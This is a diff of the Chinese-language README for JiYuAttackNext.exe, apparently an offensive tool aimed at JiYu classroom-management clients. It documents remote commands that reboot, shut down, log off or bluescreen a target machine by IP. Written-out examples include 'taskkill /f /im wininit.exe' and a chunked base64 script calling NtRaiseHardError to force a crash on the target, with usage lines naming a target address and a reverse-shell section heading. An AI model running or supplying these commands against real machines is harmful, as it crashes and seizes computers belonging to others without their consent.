@@ -199,11 +199,12 @@ start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 | `--reboot` | 开关 | — | 重启目标电脑，重发来源项目里那份固定的重启报文 |
 | `--shutdown` | 开关 | — | 关闭目标电脑，重发来源项目里那份固定的关机报文 |
 | `--logoff` | 开关 | — | 注销目标当前登录用户，通过远程命令执行 `shutdown /l` |
-| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令执行 `taskkill /f /im wininit.exe` |
+| `--bluescreen` | 开关 | — | 触发目标蓝屏，通过远程命令调用 `NtRaiseHardError` |
 
-四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道，命令文本分别为 `shutdown /l` 与 `taskkill /f /im wininit.exe`。
+四个动作互斥，必须选一个。重启与关机重发固定报文，不带倒计时与提示文字；注销与蓝屏没有独立报文，走远程命令通道：注销一条 `shutdown /l`，蓝屏是一段调用 `NtRaiseHardError` 的脚本，按命令通道上限拆成五条依次下发。
 
-蓝屏的原理是结束会话管理器进程 `wininit.exe`，Windows 会判定关键进程被终止而立即进入蓝屏并重启。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。
+蓝屏的原理是让目标进程直接调用 `ntdll.dll` 的未文档化接口 `NtRaiseHardError`，把响应选项设为关机，内核随即进入蓝屏。
+单条远程命令最多 163 个 UTF-16 单元，脚本装不下，所以先转成 base64 按 90 字符分片写进目标的临时文件，最后一条命令解码执行，共五条报文，目标允许执行远程命令时才会生效。这条命令只在目标机生效，验证时选择一台可弃用的机器即可，不要拿本机或在用的机器试。
 
 ### remote shell（反弹终端）
 
@@ -433,7 +434,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 # 注销目标当前登录用户
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
 
-# 触发目标蓝屏（结束会话管理器，机器随后重启）
+# 触发目标蓝屏（调用 NtRaiseHardError，机器随后重启）
 .\JiYuAttackNext.exe remote device -ip 10.49.151.29 --bluescreen
 ```
 
